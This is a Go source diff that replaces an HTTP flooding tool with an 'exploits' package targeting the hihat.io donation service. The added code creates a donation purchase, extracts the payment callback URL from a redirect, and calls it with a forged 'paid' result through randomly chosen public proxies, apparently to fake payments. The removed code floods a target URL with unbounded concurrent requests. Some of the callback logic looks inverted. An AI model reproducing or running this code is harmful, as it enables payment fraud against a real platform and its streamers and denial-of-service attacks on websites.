@@ -1,107 +1,48 @@
-package main
+package exploits
 
 import (
-	"context"
-	"flag"
 	"fmt"
 	"io"
 	"log"
+	"math/rand"
 	"net/http"
-	"os"
-	"os/signal"
+	"net/url"
 	"strings"
 	"sync"
-	"syscall"
-	"time"
 
-	"github.com/gookit/color"
 	"github.com/valyala/fasthttp"
+	"github.com/valyala/fasthttp/fasthttpproxy"
 )
 
-var host, err = os.Hostname()
-var threads = 50000
-var duration = 1
+var Target string
 
-var timestamp = time.Now()
-var timestampStr = timestamp.Format("2006-01-02 15:04:05")
-
-var (
-	target string
-	limit  int
-
-	LaddkoddFails   int
-	TeliaFails      int
-	ProdMobil2Fails int
-	TotalRequests   int
-)
-
-func init() {
-	flag.StringVar(&target, "url", "", "URL to send requests to")
-	flag.IntVar(&limit, "limit", 1, "Limit on number of concurrent goroutines (0 for no limit)")
-
-	flag.Parse()
-	if target == "" {
-		color.Println("[<fg=blue>INFO</>] Usage: To specify the target URL, run the program as follows:")
-		color.Println("[<fg=blue>INFO</>] ./main.go -u <URL>")
-		color.Println("[<fg=blue>INFO</>] Example: ./main.go -u https://example.com/")
-		os.Exit(1)
-	}
-}
-
-func main() {
-	var wg sync.WaitGroup
-
-	// Create a context that we can cancel
-	ctx, cancel := context.WithCancel(context.Background())
-
-	// Catch interrupt signal for graceful shutdown
-	c := make(chan os.Signal, 1)
-	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
-	go func() {
-		<-c
-		fmt.Println("Stopping...")
-		cancel() // Cancel the context to stop all goroutines
-	}()
-
-	// Create a channel to send work items to the workers
-	jobs := make(chan struct{}, limit) // Buffered channel with capacity equal to the limit
-
-	color.Println("[<fg=blue>INFO</>] An attack has been launched!")
-	color.Printf("[<fg=blue>INFO</>] Threads: %d\n", threads)
-	color.Printf("[<fg=blue>INFO</>] Duration: %d seconds\n", duration)
-	fmt.Println("")
-	color.Printf("[<fg=blue>INFO</>] Time of launch: %v", timestampStr)
-	fmt.Println("")
-	time.Sleep(time.Millisecond * 3000)
-
-	// Graceful Shutdown
-	for i := 0; i < limit; i++ {
-		wg.Add(1)
-		go worker(ctx, &wg, jobs)
-	}
-
-	// Infinite loop to continuously send requests
-	for {
-		select {
-		case <-ctx.Done():
-			close(jobs) // Close the jobs channel to signal workers to exit
-			wg.Wait()   // Wait for all workers to finish
-			fmt.Println("All workers finished. Exiting.")
-			return
-
-		default:
-			// Only send a new work item if there's room in the jobs channel
-			select {
-			case jobs <- struct{}{}: // Send a new work item to the workers
-			default:
-				// No room in the jobs channel; wait for a worker to become available
-			}
-
-		}
-	}
+func HihatDonate(target string) {
+	Target = target
+	go getNick(createPayment(target))
 }
 
 var proxyList = fetchProxies("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
+
+var (
+	clientMu sync.Mutex
+	client   *fasthttp.Client
+)
+
+func getClient() *fasthttp.Client {
+	proxy := getRandomProxy()
+
+	clientMu.Lock()
+	defer clientMu.Unlock()
+
+	if client == nil {
+		client = &fasthttp.Client{
+			Dial: fasthttpproxy.FasthttpHTTPDialer(proxy),
+		}
+
+	}
+
+	return client
+}
 
 func fetchProxies(uri string) []string {
 	resp, err := http.Get(uri)
@@ -117,46 +58,91 @@ func fetchProxies(uri string) []string {
 	return strings.Split(proxyList, "\n")
 }
 
-func worker(ctx context.Context, wg *sync.WaitGroup, jobs chan struct{}) {
-	var target = os.Args[2]
+// second
+func getNick(id string) error {
 
-	defer wg.Done()
-	for {
-		select {
-		case <-ctx.Done():
-			return
-		case <-jobs:
-			go Telia1(target)
-			go Laddkod(target)
-			go ProdMobil2(target)
+	req := fasthttp.AcquireRequest()
+	resp := fasthttp.AcquireResponse()
+	defer fasthttp.ReleaseRequest(req)
+	defer fasthttp.ReleaseResponse(resp)
 
-		}
+	req.Header.SetMethod("GET")
+	req.SetRequestURI("https://hihat.io/api/" + id)
+
+	client := getClient()
+	client.Do(req, resp)
+
+	locationHeader := string(resp.Header.Peek("Location"))
+	parsedURL, _ := url.Parse(locationHeader)
+	callbackURL := parsedURL.Query().Get("callbackurl")
+
+	if callbackURL != "" {
+	} else {
+		Se(callbackURL)
 	}
+
+	return nil
 }
 
-func Telia1(target string) {
-	req := fasthttp.AcquireRequest()
-	defer fasthttp.ReleaseRequest(req)
-	req.Header.SetMethod("GET")
-	req.SetRequestURI(target)
-	fasthttp.Do(req, nil)
-
+// first
+func createPayment(Target string) string {
+	client := &http.Client{}
+	var data = strings.NewReader(`PATH=kevzter&senderName=4324&amount=1000&message=23423&number=0706606454&type=message`)
+	req, err := http.NewRequest("POST", "https://hihat.io/api/purchase_donation", data)
+	if err != nil {
+		log.Fatal(err)
+	}
+	req.Header.Set("Accept", "*/*")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+	req.Header.Set("Cache-Control", "no-cache")
+	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("Content-type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "https://hihat.io")
+	req.Header.Set("Pragma", "no-cache")
+	req.Header.Set("Referer", "https://hihat.io/kevzter")
+	req.Header.Set("Sec-Fetch-Dest", "empty")
+	req.Header.Set("Sec-Fetch-Mode", "cors")
+	req.Header.Set("Sec-Fetch-Site", "same-origin")
+	req.Header.Set("Sec-GPC", "1")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36")
+	req.Header.Set("sec-ch-ua", `"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"`)
+	req.Header.Set("sec-ch-ua-mobile", "?0")
+	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
+	resp, err := client.Do(req)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer resp.Body.Close()
+	bodyText, err := io.ReadAll(resp.Body)
+	if err != nil {
+		log.Fatal(err)
+	}
+	fmt.Printf("%s\n", bodyText)
+	return string(bodyText)
 }
 
-func Laddkod(target string) {
-	req := fasthttp.AcquireRequest()
-	defer fasthttp.ReleaseRequest(req)
-	req.Header.SetMethod("GET")
-	req.SetRequestURI(target)
-	fasthttp.Do(req, nil)
+// final
+func Se(payid string) {
 
+	url := payid + "&resp=" + `{"result":"paid"}` // Replace with your API endpoint
+	client := getClient()
+
+	req := fasthttp.AcquireRequest()
+	resp := fasthttp.AcquireResponse()
+	defer fasthttp.ReleaseRequest(req)
+	defer fasthttp.ReleaseResponse(resp)
+
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36")
+	req.Header.Set("sec-ch-ua", `"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"`)
+	req.Header.Set("sec-ch-ua-mobile", "?1")
+	req.Header.Set("sec-ch-ua-platform", `"Android"`)
+	req.SetRequestURI(url)
+	req.Header.SetMethod("GET")
+
+	client.Do(req, resp)
 }
 
-func ProdMobil2(target string) {
-	req := fasthttp.AcquireRequest()
-	defer fasthttp.ReleaseRequest(req)
-	req.Header.SetMethod("GET")
-	req.SetRequestURI(target)
-	fasthttp.Do(req, nil)
-
+func getRandomProxy() string {
+	return proxyList[rand.Intn(len(proxyList))]
 }
